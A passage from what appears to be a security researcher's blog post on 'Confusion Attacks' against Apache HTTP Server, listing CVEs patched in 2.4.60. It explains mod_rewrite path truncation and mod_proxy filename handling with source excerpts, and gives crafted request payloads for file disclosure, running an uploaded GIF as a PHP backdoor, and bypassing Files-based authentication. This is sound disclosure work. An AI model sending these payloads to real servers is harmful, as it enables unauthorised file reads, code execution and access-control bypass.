&lt;h2 id=&quot;a-whole-new-attack--confusion-attack&quot;&gt;A Whole New Attack â€” Confusion Attack&lt;/h2&gt;

&lt;p&gt;Based on these observations, we started &lt;strong&gt;focusing on the â€œrelationshipsâ€ and â€œinteractionsâ€ among these modules&lt;/strong&gt;. If a module accidentally modifies a structure field that it considers unimportant, but is crucial for another module, it could affect the latterâ€™s decisions. Furthermore, if the definitions or semantics of the fields are not precise enough, causing ambiguities in how modules understand the same fields, it could lead to potential security risks as well!&lt;/p&gt;

&lt;p&gt;From this starting point, we developed three different types of attacks, as these attacks are more or less related to the misuse of structure fields. Hence, weâ€™ve named this attack surface â€œConfusion Attack,â€ and the following are the attacks we developed:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filename Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DocumentRoot Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Handler Confusion&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Through these attacks, we have identified 9 different vulnerabilities:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38472&lt;/strong&gt; - Apache HTTP Server on Windows UNC SSRF&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-39573&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38477&lt;/strong&gt; - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38476&lt;/strong&gt; - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38475&lt;/strong&gt; - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38474&lt;/strong&gt; - Apache HTTP Server weakness with encoded question marks in backreferences&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38473&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2023-38709&lt;/strong&gt; - Apache HTTP Server: HTTP response splitting&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-??????&lt;/strong&gt; - [redacted]&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;These vulnerabilities were reported through the official security mailing list and were addressed by the Apache HTTP Server in the &lt;a href=&quot;https://httpd.apache.org/security/vulnerabilities_24.html&quot;&gt;2.4.60 update&lt;/a&gt; published on 2024-07-01.&lt;/p&gt;

&lt;p&gt;As this is a new attack surface from Httpdâ€™s architectural design and its internal mechanisms, naturally, &lt;del&gt;the first person to delve into it can find the most vulnerabilities. Thus, I currently hold the most CVEs from Apache HTTP Server ğŸ˜‰.&lt;/del&gt; it leads to many updates that are not backward compatible. Therefore, patching these issues is not easy for many long-running production servers. If administrators update without careful consideration, they might disrupt existing configurations, causing service downtime. ğŸ˜¨&lt;/p&gt;

&lt;p&gt;Now, itâ€™s time to get started with our Confusion Attacks! Are you ready?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-1-filename-confusion&quot;&gt;ğŸ”¥ 1. Filename Confusion&lt;/h3&gt;

&lt;p&gt;The first issue stems from confusion regarding the filename field. Literally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; should represent a filesystem path. However, in Apache HTTP Server, some modules treat it as a URL. If, within an HTTP context, most modules consider &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a filesystem path but some others treat it as a URL, this inconsistency can lead to security issues!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-1-1-truncation&quot;&gt;âš”ï¸ Primitive 1-1. Truncation&lt;/h4&gt;

&lt;p&gt;So, which modules treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL? The first is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt;, which allows sysadmins to easily rewrite a path pattern to a specified substitution target using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; directive:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; Pattern Substitution [flags]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The target can be either a filesystem path or a URL. This feature likely exists for user experience. However, this â€œconvenienceâ€ also introduces risks. For instance, &lt;strong&gt;while rewriting the target paths, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; forcefully treats all results as a URL&lt;/strong&gt;, truncating the path after a question mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%3F&lt;/code&gt;. This leads to the following two exploitations.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141&quot;&gt;modules/mappers/mod_rewrite.c#L4141&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * Apply a single RewriteRule
 */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_rewrite_rule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriterule_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewrite_ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_regmatch_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regmatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AP_MAX_REG_MATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;apr_array_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nelts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apply_rewrite_cond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// [...] do the remaining stuff&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;cm&quot;&gt;/* Now adjust API&apos;s knowledge about r-&amp;gt;filename and r-&amp;gt;args */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newuri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULEFLAG_DISCARDPATHINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;splitout_queryargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------- [!!!] Truncate the `r-&amp;gt;filename`&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;ï¸-1-1-1-path-truncation&quot;&gt;âœ”ï¸ 1-1-1. Path Truncation&lt;/h5&gt;

&lt;p&gt;The first primitive leverages this truncation on the filesystem path. Imagine the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;^/user/(.+)$&quot; &quot;/var/user/$1/profile.yml&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The server would open the corresponding profile based on the username followed by the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/&lt;/code&gt;, for example:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/profile.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; forcibly treats all rewritten result as a URL, even when the target is a filesystem path, it can be truncated at a question mark, cutting off the tailing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile.yml&lt;/code&gt;, like:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange%2Fsecret.yml%3F
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/secret.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is our first primitive â€” Path Truncation. Letâ€™s pause our exploration of this primitive here for a moment. Although it might seem like a minor flaw for now, remember itâ€” it will reappear in later attacks, gradually tearing open this seemingly little breach! ğŸ˜œ&lt;/p&gt;

&lt;h5 id=&quot;ï¸-1-1-2-mislead-rewriteflag-assignment&quot;&gt;âœ”ï¸ 1-1-2. Mislead RewriteFlag Assignment&lt;/h5&gt;

&lt;p&gt;The second exploitation of the truncation primitive is to mislead the assignment of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlags&lt;/code&gt;. Imagine a sysadmin managing websites and their corresponding handlers through the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^(.+\.php)$  $1  [H=application/x-httpd-php]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If a request ends with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension, it adds the corresponding handler for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; (this can also be an Environment Variable or Content-Type; you can refer to the official &lt;a href=&quot;https://httpd.apache.org/docs/2.4/rewrite/flags.html&quot;&gt;RewriteRule Flags&lt;/a&gt; manual for details).&lt;/p&gt;

&lt;p&gt;Since the truncation behavior of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; occurs after the regular expression match, an attacker can use the original rule to apply flags to requests they shouldnâ€™t apply to by using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;. For example, an attacker could upload a GIF image embedded with malicious PHP code and execute it as a backdoor through the following crafted request:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif
 &lt;span class=&quot;c&quot;&gt;# GIF89a &amp;lt;?=`id`;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif%3fooo.php
 &lt;span class=&quot;c&quot;&gt;# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ï¸-primitive-1-2-acl-bypass&quot;&gt;âš”ï¸ Primitive 1-2. ACL Bypass&lt;/h4&gt;

&lt;p&gt;The second primitive of Filename Confusion occurs in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt;. Unlike the previous primitive which treats targets as a URL in all cases, this time &lt;strong&gt;the authentication and access control bypass is caused by the inconsistent semantic of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; among the modules!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It actually makes sense for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; to treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL, given that the primary  purpose of a Proxy is to â€œredirectâ€ requests to other URLs. However, security issues when different components interact â€” especially the case when most modules by default treat the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a filesystem path, imagine you use a file-based access control, and now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL; this inconsistency can lead to the access control or authentication bypass!&lt;/p&gt;

&lt;p&gt;A classic example is when sysadmins use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; directive to restrict a single file, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AuthType&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Basic&lt;/span&gt; 
    &lt;span class=&quot;ss&quot;&gt;AuthName&lt;/span&gt; &quot;Admin Panel&quot;
    &lt;span class=&quot;nc&quot;&gt;AuthUserFile&lt;/span&gt; &quot;/etc/apache2/.htpasswd&quot;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This type of configuration can be bypassed directly under the default PHP-FPM installation! Itâ€™s also worth mentioning that this is one of the most common ways to configure authentication in Apache HTTP Server! Suppose you visit a URL like this:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/admin.php%3Fooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;First, in the HTTP lifecycle at this URL, the authentication module will compare the requested filename with the protected files. At this point, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; field is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php?ooo.php&lt;/code&gt;, which obviously does not match &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;, so the module will assume that the current request does not require authentication. However, the PHP-FPM configuration is set to forward requests ending in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHandler&lt;/code&gt; directive:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /etc/apache2/mods-enabled/php8.2-fpm.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using (?:pattern) instead of (pattern) is a small optimization that&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avoid capturing the matching pattern (as $1) which isn&apos;t used here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;.+\.ph(?:ar|p|tml)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; &quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; will rewrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; to the following URL and call the sub-module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_fcgi&lt;/code&gt; to handle the subsequent FastCGI protocol:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since the backend receives the filename in a strange format, PHP-FPM has to handle this behavior specially. The logic of this handling is as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044&quot;&gt;sapi/fpm/fpm/fpm_main.c#L1044&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define APACHE_PROXY_FCGI_PREFIX &quot;proxy:fcgi://&quot;
#define APACHE_PROXY_BALANCER_PREFIX &quot;proxy:balancer://&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncasecmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* advance to first character of hostname */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* move past hostname and port */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */&lt;/span&gt;
